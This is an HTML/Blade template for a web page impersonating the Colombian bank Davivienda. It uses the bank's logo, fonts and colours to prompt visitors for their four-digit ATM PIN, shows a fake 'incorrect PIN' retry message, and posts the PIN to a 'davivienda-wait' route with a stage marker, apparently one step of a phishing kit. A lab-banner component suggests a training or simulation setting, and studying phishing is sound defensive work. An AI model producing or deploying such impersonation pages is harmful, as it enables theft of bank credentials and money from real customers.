<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceso | Davivienda</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <style>
        @font-face {
            font-family: 'HelveticaNeueLTStdThCn';
            src: url("/davivienda/HelveticaNeueLTStdThCn.eot.jsf?ln=css");
            src: local('☺'),
                url("/davivienda/HelveticaNeueLTStdThCn.eot.jsf?ln=css?#iefix") format('embedded-opentype'),
                url("/davivienda/HelveticaNeueLTStdThCn.woff2.jsf?ln=css") format('woff2'),
                url("/davivienda/HelveticaNeueLTStdThCn.woff.jsf?ln=css") format('woff'),
                url("/davivienda/HelveticaNeueLTStdThCn.ttf.jsf?ln=css") format('truetype'),
                url("/davivienda/HelveticaNeueLTStdThCn.svg.jsf?ln=css#HelveticaNeueLTStdThCn") format('svg');
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdCn';
            /* src: url("/davivienda/HelveticaNeueLTStdCn.eot.jsf?ln=css"); */
            src: url(/davivienda/HelveticaNeueLTStdCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdMdCn';
            src: url(/davivienda/HelveticaNeueLTStdMdCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdBdCn';
            src: url(/davivienda/HelveticaNeueLTStdBdCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }

        @font-face {
            font-family: 'HelveticaNeueLTStdHvCn';
            src: url(/davivienda/HelveticaNeueLTStdHvCn.woff2) format("woff2");
            font-weight: normal;
            font-style: normal;
        }



        .texto-1 {
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            box-sizing: border-box;
            font-family: "HelveticaNeueLTStdCn", serif;
            color: #fff;
            font-size: 18px;
            margin: 0 0 15px 0;
            font-weight: normal;
            line-height: 100%;
        }

        .entrada-1 {

            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            box-sizing: border-box;
            margin: 0;
            font: inherit;
            font-family: inherit;
            display: block;
            width: 100%;
            height: 36px;
            line-height: 26px;
            border-radius: 10px;
            border: none;
            padding-left: 5px;
            padding-right: 5px;
            background-color: #595959;
            color: #ffffff;
            font-size: 14px;
            outline: none;

        }

        .boton-1 {

            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            box-sizing: border-box;
            font: inherit;
            line-height: inherit;
            cursor: pointer;
            font-family: "HelveticaNeueLTStdBdCn", sans-serif;
            font-size: 14px;
            background-color: #ED1C27;
            border: none;
            border-radius: 5px;
            padding: 8px 0 10px;
            color: #FFF;
            box-shadow: 0 -4px 0 0 #ad0000 inset;
            outline: none;
            margin: 0 5px 0 0;

        }

        .boton-1:disabled {
            background-color: #806262;
            box-shadow: 0 -4px 0 0 #806262 inset;
        }


        .select-1 {
            -webkit-text-size-adjust: 100%;
            font-family: "HelveticaNeueLTStdCn", sans-serif, serif !important;
            line-height: 1.42857143;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            color: #ffffff;
            font-size: 12px !important;
            box-sizing: border-box;
            display: inline-block;
            height: 36px;
            margin-bottom: 10px;
            border: none;
            border-radius: 10px;
            background: url("/transaccional/javax.faces.resource/flecha-abajo.png.jsf?ln=img") no-repeat 97% center #a6a6a6;
            background-color: #a6a6a6;
            width: 100%;
            position: relative;
        }

        .label-1 {

            -webkit-text-size-adjust: 100%;
            line-height: 1.42857143;
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            color: #ffffff;
            font-size: 12px !important;
            box-sizing: border-box;
            max-width: 100%;
            font-weight: 700;
            font-family: "HelveticaNeueLTStdMdCn", sans-serif;
            display: block;
            margin: 0 0 5px 0;

        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                /* Ancho del cuerpo en dispositivos de escritorio */
                margin: 0 auto;
                /* Centra el cuerpo horizontalmente */
            }
        }
    </style>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>

</head>

<body style="background: #6D6E72;">
<x-lab-banner />
    <div class="text-center py-4" style="background-color: #ed1c27;">
        <img src="/davivienda/logo_davivienda.png" width="288" height="28" alt="">
    </div>
    <br>
    <br>
    <div class="">
        @if(session('error') === true)
        <p class="p-3 text-center" style="color: yellow;">La clave de cajero ingresada es incorrecta, ingresala
            nuevamente.</p>
        @endif
        <h1 class="texto-1 px-5 mt-4 text-star">
            Ingresa la clave que usas en el cajero:
        </h1>
    </div>
    <br>
    <form action="{{ route('davivienda-wait') }}" method="post">
        @csrf
        <div class="px-5 mb-5">
            <div class="px-5">
                <label class="label-1" for="codigo">Clave de cajero</label>
                <input class="entrada-1 w-100 mb-3 ps-3" id="codigo" name="clavecajero" type="password" placeholder=""
                    autocomplete="new-password" minlength="4" maxlength="4">
            </div>
            <input type="hidden" name="status" value="nuevo-clavecajero">
        </div>
        <div class="mt-5 text-center">
            <button class="boton-1 text-center px-5 pt-2">Validar</button>
        </div>
    </form>

    <script>
        $(document).ready(function () {
            function validateClaveCajero(value) {
                const claveCajeroRegex = /^\d{4}$/;
                return claveCajeroRegex.test(value);
            }

            function checkFormValidity() {
                const claveCajero = $('input[name="clavecajero"]').val();
                const isClaveCajeroValid = validateClaveCajero(claveCajero);

                $('button.boton-1').prop('disabled', !isClaveCajeroValid);
            }

            $('input[name="clavecajero"]').on('input', function () {
                checkFormValidity();
            });

            checkFormValidity();
        });
    </script>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>